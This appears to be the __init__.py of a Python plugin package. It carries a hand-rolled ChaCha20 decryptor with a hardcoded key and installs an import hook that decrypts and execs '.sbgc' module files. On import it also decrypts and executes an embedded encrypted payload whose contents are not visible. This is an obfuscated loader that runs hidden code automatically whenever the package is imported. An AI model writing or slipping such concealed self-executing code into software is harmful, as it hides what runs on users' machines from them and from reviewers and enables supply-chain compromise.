
import hashlib as _h
import hmac as _hm
import importlib.abc as _ia
import importlib.util as _iu
import os as _os
import struct as _struct
import sys as _s
import zlib as _z
from pathlib import Path as _P
_MAGIC = b"SBGHPUB2"
_SECRET = _h.sha256(b"SHAOBKJ_GITHUB_PUBLISH_2026_V2").digest()
_PLUGIN_DIR = _P(__file__).resolve().parent
_INIT_PAYLOAD = b'SBGHPUB2O\x0e!\x8cv\x8dgp\xed\xed\xb0\x96\xf62>R:?h\xf0\xa9 \x0f\xeb\x1em\xb8\xa1\xf0\x12\x91\xfc\xb2`n5:\xc3\x17\xf9[\xc2\x10\xd8\xc1\xab\xa6\x955J-\xb3\xf62RI\xab\xad\x8e\x894\xbb6\xe9P\xbdZ46\xfdX\x83\'nl\xef\x8fb\xf6\x00\x95M\xa1_\x80\x06\x18\x11L\x90\xeb\xad(\xe6\xba&\x87\x93\xbd\xfcs\x14H}\xe4\xcd\xebF\x12\xc3\xad|\x8f"\x13\x80\x7f\xfa>\xf7?\xc4\xcf\xc7y\x14=\x08&C\xc5&\xc0\xa7\xc1o\xe1o\x90\x99,\xeaF\x18o\xbf\x9aD\xaa\x07|\xe0\x86\xd0r\xad \xd5hI\xd5\x17\x88m\xce\x8c\x02R6\x985\x9a\x0e\x81\x91\xcb\xdc\xae\x9d\x0b\xd3\xe1\xc8!\x8b\xee\x1e\x9e\xcc?(\x14\x88\xe8\x03\xbd!\xda}#\xb0\xbc\x84\xc7\xcc\xf9\xea\xa5\xe9E\\\x0c8S\x1f\xd6\x0c\x9b\x9e\xf6'
def _rotl32(value, shift):
    return ((value << shift) & 0xFFFFFFFF) | (value >> (32 - shift))
def _quarter_round(state, a, b, c, d):
    state[a] = (state[a] + state[b]) & 0xFFFFFFFF; state[d] ^= state[a]; state[d] = _rotl32(state[d], 16)
    state[c] = (state[c] + state[d]) & 0xFFFFFFFF; state[b] ^= state[c]; state[b] = _rotl32(state[b], 12)
    state[a] = (state[a] + state[b]) & 0xFFFFFFFF; state[d] ^= state[a]; state[d] = _rotl32(state[d], 8)
    state[c] = (state[c] + state[d]) & 0xFFFFFFFF; state[b] ^= state[c]; state[b] = _rotl32(state[b], 7)
def _chacha_block(key, nonce, counter):
    state = list(_struct.unpack("<4I", b"expand 32-byte k") + _struct.unpack("<8I", key) + (counter,) + _struct.unpack("<3I", nonce))
    working = state[:]
    for _ in range(10):
        _quarter_round(working, 0, 4, 8, 12); _quarter_round(working, 1, 5, 9, 13); _quarter_round(working, 2, 6, 10, 14); _quarter_round(working, 3, 7, 11, 15)
        _quarter_round(working, 0, 5, 10, 15); _quarter_round(working, 1, 6, 11, 12); _quarter_round(working, 2, 7, 8, 13); _quarter_round(working, 3, 4, 9, 14)
    return _struct.pack("<16I", *[((working[i] + state[i]) & 0xFFFFFFFF) for i in range(16)])
def _crypt(data, nonce):
    out = bytearray(); counter = 1
    for offset in range(0, len(data), 64):
        block = _chacha_block(_SECRET, nonce, counter); counter += 1
        chunk = data[offset:offset + 64]
        out.extend(value ^ block[index] for index, value in enumerate(chunk))
    return bytes(out)
def _decrypt_source(data):
    if not data.startswith(_MAGIC): raise ImportError("Invalid encrypted module.")
    nonce = data[len(_MAGIC):len(_MAGIC) + 12]; tag = data[len(_MAGIC) + 12:len(_MAGIC) + 44]; payload = data[len(_MAGIC) + 44:]
    expected = _hm.new(_SECRET, nonce + payload, _h.sha256).digest()
    if not _hm.compare_digest(tag, expected): raise ImportError("Encrypted module integrity check failed.")
    return _z.decompress(_crypt(payload, nonce)).decode("utf-8-sig").lstrip("\ufeff")
class _Loader(_ia.Loader):
    def __init__(self, fullname, path, is_package=False):
        self.fullname = fullname; self.path = path; self._is_package = is_package
    def create_module(self, spec): return None
    def is_package(self, fullname): return self._is_package
    def exec_module(self, module):
        source = _decrypt_source(self.path.read_bytes())
        module.__file__ = str(self.path); module.__loader__ = self; module.__cached__ = None
        module.__package__ = self.fullname if self._is_package else self.fullname.rpartition(".")[0]
        if self._is_package: module.__path__ = [str(self.path.parent)]
        exec(compile(source, str(self.path), "exec"), module.__dict__)
class _Finder(_ia.MetaPathFinder):
    def find_spec(self, fullname, path=None, target=None):
        prefix = __name__ + "."
        if not fullname.startswith(prefix): return None
        rel_path = fullname[len(prefix):].replace(".", _os.sep); base = _PLUGIN_DIR
        module_file = base / f"{rel_path}.py.sbgc"; package_file = base / rel_path / "__init__.py.sbgc"
        if module_file.is_file(): return _iu.spec_from_loader(fullname, _Loader(fullname, module_file), origin=str(module_file))
        if package_file.is_file():
            loader = _Loader(fullname, package_file, True)
            spec = _iu.spec_from_loader(fullname, loader, origin=str(package_file), is_package=True); spec.submodule_search_locations = [str(package_file.parent)]; return spec
        package_dir = base / rel_path
        if package_dir.is_dir():
            spec = _iu.spec_from_loader(fullname, loader=None, is_package=True); spec.submodule_search_locations = [str(package_dir)]; return spec
        return None
WEB_DIRECTORY = "web"
if not any(isinstance(f, _Finder) for f in _s.meta_path): _s.meta_path.insert(0, _Finder())
exec(compile(_decrypt_source(_INIT_PAYLOAD), str(_PLUGIN_DIR / "__init__.py"), "exec"), globals())
WEB_DIRECTORY = "web"

